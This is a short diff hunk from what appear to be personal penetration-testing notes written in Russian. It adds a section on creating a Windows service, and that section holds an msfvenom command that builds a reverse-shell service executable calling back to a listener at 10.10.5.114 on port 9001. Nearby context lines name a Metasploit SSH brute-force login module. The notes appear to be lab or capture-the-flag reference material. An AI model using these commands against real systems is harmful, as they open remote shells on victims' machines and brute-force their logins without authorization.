@@ -134,6 +134,10 @@ set filename Test3.pdf
 Здесь задаём имя нашему файлу
 
 
+# Создаем службу для виндоас
+
+      msfvenom -p windows/shell_reverse_tcp -f exe-service LHOST=10.10.5.114 LPORT=9001 -o rev_service.exe
+
 # Для брута 
 use auxiliary/scanner/ssh/ssh_login
 
